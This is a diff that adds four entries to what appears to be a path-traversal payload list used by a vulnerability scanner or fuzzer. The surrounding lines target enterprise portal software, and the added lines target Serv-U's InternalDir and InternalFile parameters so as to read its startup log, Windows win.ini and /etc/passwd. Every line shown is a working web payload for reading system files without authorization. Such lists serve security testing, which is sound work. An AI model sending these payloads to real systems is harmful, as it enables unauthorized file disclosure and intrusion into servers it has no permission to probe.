@@ -779,3 +779,7 @@
 /portal/pt/printpdf/printBill?pageId=login&filePath=../../startup.bat
 /portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml
 /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js
+/?InternalDir=/../../../../ProgramData/RhinoSoft/Serv-U/&InternalFile=Serv-U-StartupLog.txt
+/?InternalDir=../../../../../Windows&InternalFile=win.ini
+/?InternalDir=\\..\\..\\..\\..\\usr\\local\\Serv-U&InternalFile=Serv-U-StartupLog.txt
+/?InternalDir=\\..\\..\\..\\..\\etc&InternalFile=passwd
